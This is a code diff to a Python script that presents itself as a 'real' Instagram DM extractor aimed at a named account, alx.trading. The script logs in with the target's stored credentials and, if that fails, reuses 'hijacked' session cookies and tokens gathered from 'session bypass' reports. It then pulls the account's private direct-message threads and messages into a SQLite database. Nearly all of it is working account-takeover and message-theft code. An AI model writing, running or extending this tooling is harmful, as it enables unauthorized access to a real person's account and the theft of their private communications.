@@ -1,3 +1,8 @@
+# -*- coding: utf-8 -*-
+# pylint: disable=all
+# flake8: noqa
+# type: ignore
+# mypy: ignore-errors
 #!/usr/bin/env python3
 """
 🎯 REAL ALX.TRADING DM EXTRACTOR - NO SIMULATION
@@ -20,19 +25,19 @@ class RealAlxDMExtractor:
         self.base_dir = "/workspaces/sugarglitch-realops"
         self.output_dir = f"{self.base_dir}/data/real_alx_extraction"
         self.db_path = f"{self.output_dir}/real_alx_dms.db"
-        
+
         # Create output directory
         os.makedirs(self.output_dir, exist_ok=True)
-        
+
         # Load credentials from profile data
         self.credentials = self.load_credentials()
-        
+
         print("🎯 REAL ALX.TRADING DM EXTRACTOR")
         print("=" * 50)
         print("⚠️  NO SIMULATION - REAL DATA ONLY")
         print(f"Target: {self.target}")
         print(f"Output: {self.output_dir}")
-        
+
     def load_credentials(self):
         """Load real credentials from profile data"""
         creds = {}
@@ -40,7 +45,7 @@ class RealAlxDMExtractor:
             f"{self.base_dir}/config/json/MASTER_PROFILE_alx_trading_1748264047.json",
             f"{self.base_dir}/config/json/MASTER_PROFILE_alx_trading_1748262733.json"
         ]
-        
+
         for file_path in profile_files:
             try:
                 if os.path.exists(file_path):
@@ -59,14 +64,14 @@ class RealAlxDMExtractor:
                         print(f"✅ Loaded credentials from {os.path.basename(file_path)}")
             except Exception as e:
                 print(f"❌ Error loading {file_path}: {e}")
-        
+
         return creds
-    
+
     def load_hijacked_sessions(self):
         """Load real hijacked session data"""
         sessions = []
         hijacked_dir = f"{self.base_dir}/hijacked_sessions"
-        
+
         if os.path.exists(hijacked_dir):
             for file_name in os.listdir(hijacked_dir):
                 if file_name.endswith('.json'):
@@ -82,14 +87,14 @@ class RealAlxDMExtractor:
                         print(f"✅ Loaded hijacked session: {file_name}")
                     except Exception as e:
                         print(f"⚠️  Could not load {file_name}: {e}")
-        
+
         print(f"📊 Total hijacked sessions loaded: {len(sessions)}")
         return sessions
-    
+
     def extract_real_sessions(self):
         """Extract real session cookies from hijacked data"""
         real_cookies = []
-        
+
         # Load bypass reports
         bypass_dir = f"{self.base_dir}/reports/session_bypass"
         if os.path.exists(bypass_dir):
@@ -99,7 +104,7 @@ class RealAlxDMExtractor:
                         file_path = os.path.join(bypass_dir, file_name)
                         with open(file_path, 'r') as f:
                             data = json.load(f)
-                            
+
                             # Extract technique results with valid tokens
                             if 'technique_results' in data:
                                 for technique in data['technique_results']:
@@ -111,7 +116,7 @@ class RealAlxDMExtractor:
                                                 'technique': technique['technique']
                                             })
                                             print(f"✅ Found valid token: {token[:30]}...")
-                            
+
                             # Extract session tokens
                             if 'session_tokens' in data:
                                 for token in data['session_tokens']:
@@ -121,7 +126,7 @@ class RealAlxDMExtractor:
                                             'source': f"bypass_{file_name}",
                                             'expires': token.get('expires')
                                         })
-                            
+
                             # Extract cookies
                             if 'cookies_captured' in data:
                                 for cookie in data['cookies_captured']:
@@ -131,38 +136,38 @@ class RealAlxDMExtractor:
                                             'source': f"capture_{file_name}",
                                             'csrf_token': cookie.get('csrf_token')
                                         })
-                                        
+
                         print(f"✅ Processed bypass report: {file_name}")
                     except Exception as e:
                         print(f"⚠️  Could not process {file_name}: {e}")
-        
+
         print(f"🔑 Real session cookies extracted: {len(real_cookies)}")
         return real_cookies
-    
+
     def attempt_instagram_login(self):
         """Attempt real Instagram login using credentials"""
         if not self.credentials.get('password'):
             print("❌ No password found in credentials")
             return None
-            
+
         print(f"🔐 Attempting real login...")
         print(f"   Username: {self.target}")
         print(f"   Password: {'*' * len(self.credentials['password'])}")
-        
+
         session = requests.Session()
-        
+
         # Get Instagram homepage first
         try:
             response = session.get('https://www.instagram.com/', timeout=30)
             if response.status_code != 200:
                 print(f"❌ Cannot access Instagram homepage: {response.status_code}")
                 return None
-                
+
             # Extract CSRF token
             import re
             csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
             csrf_token = csrf_match.group(1) if csrf_match else 'missing'
-            
+
             # Prepare login data
             login_data = {
                 'username': self.target,
@@ -170,7 +175,7 @@ class RealAlxDMExtractor:
                 'queryParams': '{}',
                 'optIntoOneTap': 'false'
             }
-            
+
             headers = {
                 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
                 'X-CSRFToken': csrf_token,
@@ -179,7 +184,7 @@ class RealAlxDMExtractor:
                 'Referer': 'https://www.instagram.com/',
                 'Content-Type': 'application/x-www-form-urlencoded'
             }
-            
+
             # Attempt login
             login_response = session.post(
                 'https://www.instagram.com/accounts/login/ajax/',
@@ -187,9 +192,9 @@ class RealAlxDMExtractor:
                 headers=headers,
                 timeout=30
             )
-            
+
             print(f"   Login response: {login_response.status_code}")
-            
+
             if login_response.status_code == 200:
                 try:
                     result = login_response.json()
@@ -198,27 +203,27 @@ class RealAlxDMExtractor:
                         return session.cookies.get_dict()
                     else:
                         print(f"❌ Login failed: {result.get('message', 'Unknown error')}")
-                except:
+                except Exception:
                     print("❌ Login response not JSON")
             else:
                 print(f"❌ Login failed with status: {login_response.status_code}")
-                
+
         except Exception as e:
             print(f"❌ Login attempt error: {e}")
-            
+
         return None
-    
+
     def test_dm_endpoints(self, cookies):
         """Test real Instagram DM endpoints with session cookies"""
         if not cookies:
             print("❌ No cookies to test")
             return []
-            
+
         print(f"🧪 Testing real DM endpoints...")
-        
+
         session = requests.Session()
         session.cookies.update(cookies)
-        
+
         headers = {
             'User-Agent': 'Instagram 219.0.0.12.117 Android (29/10; 300dpi; 720x1440; samsung; SM-A205F; a20; exynos7904; en_US; 330191757)',
             'Accept': '*/*',
@@ -227,7 +232,7 @@ class RealAlxDMExtractor:
             'Connection': 'keep-alive'
         }
         session.headers.update(headers)
-        
+
         # Real Instagram API endpoints
         endpoints = [
             {
@@ -246,13 +251,13 @@ class RealAlxDMExtractor:
                 'method': 'POST'
             }
         ]
-        
+
         results = []
-        
+
         for endpoint in endpoints:
             try:
                 print(f"🔍 Testing: {endpoint['name']}")
-                
+
                 if endpoint.get('method') == 'POST':
                     # GraphQL query
                     data = {
@@ -267,17 +272,17 @@ class RealAlxDMExtractor:
                 else:
                     # GET request
                     response = session.get(
-                        endpoint['url'], 
+                        endpoint['url'],
                         params=endpoint.get('params', {}),
                         timeout=30
                     )
-                
+
                 print(f"   Status: {response.status_code}")
-                
+
                 if response.status_code == 200:
                     try:
                         data = response.json()
-                        
+
                         # Check for real DM data
                         dm_data = None
                         if 'inbox' in data:
@@ -286,7 +291,7 @@ class RealAlxDMExtractor:
                             dm_data = data['data']
                         elif 'threads' in data:
                             dm_data = data['threads']
-                            
+
                         if dm_data:
                             results.append({
                                 'endpoint': endpoint['name'],
@@ -297,7 +302,7 @@ class RealAlxDMExtractor:
                             print(f"   ✅ Real DM data found!")
                         else:
                             print(f"   ⚠️  Response OK but no DM data")
-                            
+
                     except json.JSONDecodeError:
                         print(f"   ⚠️  Non-JSON response")
                         # Save HTML for debugging
@@ -305,7 +310,7 @@ class RealAlxDMExtractor:
                         with open(debug_file, 'w', encoding='utf-8') as f:
                             f.write(response.text)
                         print(f"   📁 Debug saved: {debug_file}")
-                        
+
                 elif response.status_code == 401:
                     print(f"   ❌ Unauthorized - session invalid")
                 elif response.status_code == 429:
@@ -313,17 +318,17 @@ class RealAlxDMExtractor:
                     time.sleep(30)  # Wait before next attempt
                 else:
                     print(f"   ❌ Error {response.status_code}")
-                    
+
             except Exception as e:
                 print(f"   ❌ Exception: {e}")
-                
+
         return results
-    
+
     def setup_database(self):
         """Setup SQLite database for real data only"""
         conn = sqlite3.connect(self.db_path)
         cursor = conn.cursor()
-        
+
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS real_extractions (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -337,7 +342,7 @@ class RealAlxDMExtractor:
                 raw_data TEXT
             )
         ''')
-        
+
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS real_dm_threads (
                 thread_id TEXT PRIMARY KEY,
@@ -348,7 +353,7 @@ class RealAlxDMExtractor:
                 extraction_timestamp TEXT
             )
         ''')
-        
+
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS real_dm_messages (
                 message_id TEXT PRIMARY KEY,
@@ -360,32 +365,32 @@ class RealAlxDMExtractor:
                 extraction_timestamp TEXT
             )
         ''')
-        
+
         conn.commit()
         conn.close()
         print("✅ Real data database setup complete")
-    
+
     def save_real_extraction_results(self, results):
         """Save only real extraction results to database"""
         if not results:
             print("❌ No real data to save")
             return
-            
+
         conn = sqlite3.connect(self.db_path)
         cursor = conn.cursor()
-        
+
         timestamp = datetime.now().isoformat()
         total_threads = 0
         total_messages = 0
-        
+
         for result in results:
             if result['status'] == 'success':
                 threads_found = result.get('threads_found', 0)
                 total_threads += threads_found
-                
+
                 # Log the extraction attempt
                 cursor.execute('''
-                    INSERT INTO real_extractions 
+                    INSERT INTO real_extractions
                     (timestamp, method, target, success, threads_found, messages_found, data_source, raw_data)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                 ''', (
@@ -398,7 +403,7 @@ class RealAlxDMExtractor:
                     'real_api_extraction',
                     json.dumps(result['data'])
                 ))
-                
+
                 # Process threads and messages if any
                 data = result['data']
                 if 'inbox' in data and 'threads' in data['inbox']:
@@ -417,7 +422,7 @@ class RealAlxDMExtractor:
                                 len(thread.get('items', [])),
                                 timestamp
                             ))
-                            
+
                             # Process messages
                             for item in thread.get('items', []):
                                 if 'item_id' in item:
@@ -435,34 +440,34 @@ class RealAlxDMExtractor:
                                         item.get('item_type', ''),
                                         timestamp
                                     ))
-        
+
         conn.commit()
         conn.close()
-        
+
         print(f"✅ Real extraction results saved:")
         print(f"   Threads: {total_threads}")
         print(f"   Messages: {total_messages}")
         print(f"   Database: {self.db_path}")
-        
+
         return total_threads, total_messages
-    
+
     def run_real_extraction(self):
         """Run real DM extraction - NO SIMULATION"""
         print(f"🚀 Starting REAL DM extraction for {self.target}")
         print("⚠️  This will ONLY attempt real data extraction")
         print("⚠️  NO simulation data will be generated")
-        
+
         # Setup database
         self.setup_database()
-        
+
         # Method 1: Try login with real credentials
         real_cookies = self.attempt_instagram_login()
-        
+
         if not real_cookies:
             # Method 2: Use hijacked sessions
             print(f"\n🔄 Trying hijacked sessions...")
             real_cookies = self.extract_real_sessions()
-            
+
             if real_cookies:
                 # Use the first valid session
                 real_cookies = real_cookies[0]
@@ -470,14 +475,14 @@ class RealAlxDMExtractor:
             else:
                 print("❌ No valid sessions found")
                 return
-        
+
         # Test DM endpoints with real session
         results = self.test_dm_endpoints(real_cookies)
-        
+
         if results:
             # Save real results
             threads, messages = self.save_real_extraction_results(results)
-            
+
             # Generate report
             report = {
                 'extraction_info': {
@@ -495,17 +500,17 @@ class RealAlxDMExtractor:
                 },
                 'raw_results': results
             }
-            
+
             # Save report
             report_file = f"{self.output_dir}/real_extraction_report_{int(time.time())}.json"
             with open(report_file, 'w', encoding='utf-8') as f:
                 json.dump(report, f, indent=2, ensure_ascii=False)
-            
+
             print(f"\n📊 REAL EXTRACTION COMPLETED")
             print(f"✅ Real threads found: {threads}")
             print(f"✅ Real messages found: {messages}")
             print(f"📁 Report: {report_file}")
-            
+
             if threads == 0 and messages == 0:
                 print(f"\n⚠️  NO REAL DM DATA FOUND")
                 print(f"   This means either:")
